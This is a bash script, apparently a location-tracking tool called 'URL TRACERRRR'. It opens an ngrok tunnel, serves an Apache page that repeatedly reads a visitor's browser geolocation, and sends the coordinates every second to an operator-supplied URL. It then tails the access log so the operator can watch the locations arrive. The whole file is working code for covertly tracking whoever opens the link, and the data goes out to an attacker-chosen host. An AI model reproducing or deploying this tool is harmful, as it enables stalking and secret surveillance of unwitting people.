#!/bin/bash

#64_bit
#xterm -e ./ngrok http 80 & clear

#32_Bit
xterm -e ./ngrok http 80 & clear


echo " URL TRACERRRR
                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>NRSH</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"\");
                background-size: 1000px 1600px;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp .jpg /var/www/html/.jpg
service apache2 start
echo "         ______________________________________________________   
       URL TRACERRRR
                                                                  " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
